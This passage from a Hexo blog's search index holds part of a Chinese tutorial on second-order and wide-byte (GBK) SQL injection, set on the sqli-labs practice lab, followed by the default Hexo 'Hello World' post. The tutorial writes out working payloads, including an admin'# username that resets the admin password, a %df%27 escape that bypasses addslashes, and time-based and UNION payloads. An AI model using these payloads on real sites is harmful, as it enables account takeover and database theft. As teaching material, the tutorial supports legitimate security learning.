并不会插入到数据库中，在写入数据库时还是保留了原来的数据。</p><p>在将数据存入数据库之后，开发者就认为数据是可信的。在下一次进行查询时，直接从数据库中取出脏数据，没有进行下一步的检验和处理，这样就会造成 SQL 的二次注入。例如，在第一次插入数据时，数据中带有单引号，直接插入到数据库中；然后在下一次使用中，在拼凑的过程中，就形成了二次注入。</p><h2 id="1-10-1二次注入代码分析"><a href="#1-10-1二次注入代码分析" class="headerlink" title="1.10.1二次注入代码分析"></a>1.10.1二次注入代码分析</h2><p>在 <code>sqli-lbas 24</code> 中存在二次注入。先来分析一下代码。</p><p><code>mysql_escape_string</code> 函数会将特殊字符进行过滤，例如 <code>&#39;</code> 经过转义就成了 <code>\&#39;</code>，然后用 <code>INSERT INTO</code> 存入数据库中。</p><p>在 <code>login.php</code> 中查看源码，登录时获取用户名和密码，使用 <code>mysql_escape_string</code> 对输入的参数进行转义。转义之后在数据库中查找指定的账号和密码，再传入到 <code>session</code> 中。</p><p>在 <code>pass_change.php</code> 中查看源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] 复制给 <span class="variable">$username</span> 无任何过滤再带入 UPDATE 语句中造成注入。</span><br></pre></td></tr></table></figure><p>整个流程就是：注册用户 → 更改密码时触发注入。可以看到二次注入较为隐蔽，通常发生在需要二次带入数据提交的功能里，例如用户注册 → 修改密码，邮箱注册 → 修改密码，文章添加 → 文章编辑等。</p><h2 id="1-19-8-黑盒环境下进行二次注入测试"><a href="#1-19-8-黑盒环境下进行二次注入测试" class="headerlink" title="1.19.8 黑盒环境下进行二次注入测试"></a>1.19.8 黑盒环境下进行二次注入测试</h2><p>先确定测试的网站是否进行过滤，一般情况下网站都会对输入的参数进行过滤，然后寻找可能会带入恶意数据二次使用的地方。例如：</p><ul><li>用户注册 → 修改密码</li><li>邮箱注册 → 修改密码</li><li>文章添加 → 文章编辑</li></ul><p>寻找一切存在二次使用的功能点。</p><p>二次注入测试中，二次注入多数是字符型注入，所以要注意闭合问题。现在注册用户 <code>a&#39;</code>，再分别注册用户 <code>a&#39; AND 1=1#</code> 和 <code>a&#39; AND 1=2#</code>，然后在可能触发的地方进行测试。</p><p>密码输入 <code>a123456</code> 提交后可以看到密码被修改成功了。如果是 <code>a&#39; AND 1=2#</code>，则怎么修改都不会成功。</p><p>这种情况下可以判断是二次注入。这个注入点传入的参数有长度限制，导致二次注入查询敏感信息，二次注入配合 MySQL 报错查询数据均不能成功，只能修改其他账号的密码了，例如 <code>admin</code> 的密码。</p><p>注册用户 <code>admin&#39;#</code>，登录后修改密码，就能修改 <code>admin</code> 的密码。</p><h1 id="1-11-宽字节注入"><a href="#1-11-宽字节注入" class="headerlink" title="1.11 宽字节注入"></a>1.11 宽字节注入</h1><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入，在 SQL 进行防注入的时候，一般会开启 <code>GPC</code>，过滤特殊字符。一般情况下开启 <code>GPC</code> 是可以防御很多字符串型的注入，但是如果数据库编码不对，也可以导致 SQL 防注入绕过，达到注入的目的。如果数据库设置宽字节字符集 <code>GBK</code> 会导致宽字节注入，从而逃逸 <code>GPC</code>。</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>简单理解：数据库编码与 PHP 编码设置为不同的两个编码那么就有可能产生宽字节注入。</p><p>深入讲解：要有宽字节注入漏洞，首先要满足数据库后端使用双&#x2F;多字节解析 SQL 语句，其次还要保证在这种字符集范围中包含低字节位是 <code>0x5C (01011100)</code> 的字符。初步的测试结果 <code>Big5</code> 和 <code>GBK</code> 字符集都是有的，<code>UTF-8</code> 和 <code>GB2312</code> 没有这种字符（也就不存在宽字节注入）。</p><h2 id="GPC-绕过过程"><a href="#GPC-绕过过程" class="headerlink" title="GPC 绕过过程"></a>GPC 绕过过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27 ===(addslashes)===&gt; %df%5c%27 ===(数据库 GBK)===&gt; 運&#x27;</span><br></pre></td></tr></table></figure><h2 id="1-11-1-宽字节注入代码分析"><a href="#1-11-1-宽字节注入代码分析" class="headerlink" title="1.11.1 宽字节注入代码分析"></a>1.11.1 宽字节注入代码分析</h2><p>从源代码分析，存在漏洞的代码首先 <code>check_addslashes</code> 是将特殊字符进行过滤，将 <code>&#39;</code> 变成 <code>\&#39;</code>。<code>mysql_query</code> 设置数据库的编码为 <code>GBK</code>，将 <code>id</code> 参数传入到 SQL 中带入查询。传入 <code>%df%27</code> 即可逃逸 <code>GPC</code>，故存在宽字节注入。</p><h2 id="1-11-2-黑盒环境下的宽字节攻击"><a href="#1-11-2-黑盒环境下的宽字节攻击" class="headerlink" title="1.11.2 黑盒环境下的宽字节攻击"></a>1.11.2 黑盒环境下的宽字节攻击</h2><p>宽字节检测较为简单，输入 <code>%df%27</code> 检测即可，或者使用配合 <code>and 1=1</code> 检测即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1%df%27%20and%201=1--+ 页面是否存在乱码</span><br><span class="line">-1%df%27%20or%20sleep(10)--+ 页面是否存在延时</span><br></pre></td></tr></table></figure><p>均可以测试存在宽字节注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/13/hello-world/"/>
      <url>/2025/04/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
